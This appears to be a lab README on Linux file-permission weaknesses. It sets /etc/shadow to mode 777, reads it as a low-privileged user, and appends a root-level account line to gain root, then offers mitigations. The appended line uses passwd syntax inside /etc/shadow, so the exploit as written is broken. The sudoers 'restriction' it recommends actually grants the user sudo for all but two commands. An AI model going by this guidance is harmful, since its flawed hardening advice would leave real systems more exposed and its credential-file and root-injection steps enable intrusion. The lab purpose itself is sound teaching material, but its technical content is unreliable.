# 🔒 Linux Security: User & File Permission Hardening

This repository explores **user privilege misconfigurations** and **file permission weaknesses** in Linux, focusing on **exploitation techniques** and **preventative security measures**. 🚀

---

## 🎯 Project Scope
This guide will help you:
- 👤 **Understand user privilege risks**
- 🚨 **Exploit misconfigured file permissions**
- 🛡 **Harden user and file access controls**

---

## 🛠️ Step 1: Setting Up Vulnerable User & Permissions

### 📌 **1️⃣ Create a User with Weak Security Settings**
```bash
# Create a low-privileged user
┌──(kali㉿kali)-[~]
└─$ sudo useradd attacker

# Assign a weak password
┌──(kali㉿kali)-[~]
└─$ echo "attacker:12345" | sudo chpasswd

# Verify user creation
┌──(kali㉿kali)-[~]
└─$ cat /etc/passwd | grep attacker
```

### ⚠️ **2️⃣ Misconfigure File Permissions (High Risk!)**
```bash
# Set world-writable permissions on sensitive files
┌──(kali㉿kali)-[~]
└─$ sudo chmod 777 /etc/shadow

# Verify insecure permissions
┌──(kali㉿kali)-[~]
└─$ ls -l /etc/shadow
-rwxrwxrwx 1 root shadow 1722 Mar 17 19:11 /etc/shadow
```

---

## 🚀 Step 2: Exploiting Weak Permissions

### 🔎 **3️⃣ Switch to the Low-Privileged User**
```bash
# Switch to attacker account
┌──(kali㉿kali)-[~]
└─$ su - attacker
Password: 12345
```

### 🛠 **4️⃣ Read & Modify Sensitive Files**
```bash
# View the contents of /etc/shadow (normally restricted)
attacker@kali:~$ cat /etc/shadow

# Inject a new root-level user into the system
attacker@kali:~$ echo "root_hacker::0:0::/:/bin/bash" | tee -a /etc/shadow

# Switch to root (no password required)
attacker@kali:~$ su root_hacker
```

---

## 🔐 Step 3: Mitigating Permission Vulnerabilities

### 🛡 **5️⃣ Restore Secure File Permissions**
```bash
# Restrict access to /etc/shadow
┌──(kali㉿kali)-[~]
└─$ sudo chmod 640 /etc/shadow
┌──(kali㉿kali)-[~]
└─$ sudo chown root:shadow /etc/shadow

# Verify secure file permissions
┌──(kali㉿kali)-[~]
└─$ ls -l /etc/shadow
-rw-r----- 1 root shadow 1722 Mar 17 19:11 /etc/shadow
```

### 🔒 **6️⃣ Secure User Privileges in sudoers File**
```bash
# Edit sudoers configuration
┌──(kali㉿kali)-[~]
└─$ sudo visudo
```
Add the following line to restrict **attacker** from running privileged commands:
```plaintext
attacker ALL=(ALL) !/bin/su, !/bin/bash
```

---

## 📌 Task 1 - Summary Table

| **Step**  | **Action** | **Command/Details** |
|-----------|--------------------------------|-----------------------------|
| 🛠 **Setup** | Create user **attacker** | `sudo useradd attacker` |
| | Assign a weak password | `echo "attacker:12345" | sudo chpasswd` |
| | Verify user creation | `cat /etc/passwd | grep attacker` |
| | Set weak file permissions | `sudo chmod 777 /etc/shadow` |
| | Confirm misconfiguration | `ls -l /etc/shadow` |
| 🚀 **Exploitation** | Switch to attacker | `su - attacker` |
| | Access sensitive files | `cat /etc/shadow` |
| | Modify shadow file | `echo "root_hacker::0:0::/:/bin/bash" | tee -a /etc/shadow` |
| | Gain root privileges | `su root_hacker` |
| 🔐 **Mitigation** | Restore secure permissions | `sudo chmod 640 /etc/shadow`<br>`sudo chown root:shadow /etc/shadow` |
| | Restrict attacker in sudoers | `sudo visudo` + `attacker ALL=(ALL) !/bin/su, !/bin/bash` |

---

### 🛡 **Final Thoughts**
✅ **Always enforce strict file permissions and monitor user privileges to prevent unauthorized access!**

🚀 Stay Secure! 🔒
